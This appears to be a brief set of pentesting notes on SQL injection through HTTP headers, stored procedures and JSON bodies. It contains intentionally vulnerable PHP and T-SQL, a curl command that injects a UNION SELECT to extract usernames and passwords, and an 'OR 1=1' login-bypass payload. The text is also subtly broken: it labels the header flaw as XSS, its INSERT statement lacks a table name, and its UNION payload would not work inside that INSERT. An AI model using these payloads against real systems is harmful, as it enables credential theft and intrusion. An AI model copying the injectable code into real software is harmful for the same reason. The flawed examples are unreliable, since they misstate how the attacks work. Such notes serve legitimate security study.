# Header injection
Some applications will use the `User-Agent` field to track the user. If they do not sanitize this is a great area to store XSS.

Vulnerable code:
```php
$agent = $_SERVER['HTTP_USER_AGENT'];
$sql = "INSERT INTO (user_agent) VALUES ('$agent')";
```

Exploit:
```sh
curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.10.10.10/home
```

## Stored Procedures
Improve performance and consistency by pre-defining the queries. If they are not sanitized they pose the same risk:

```sql
CREATE PROCEDURE get_user_data
    @username NVARCHAR(50)
AS
BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```

## XML & JSON
Any application that parses XML or JSON data and then queries it:
```json
{
    "username": "admin' OR '1'='1--",
    "password": "password"
}
```
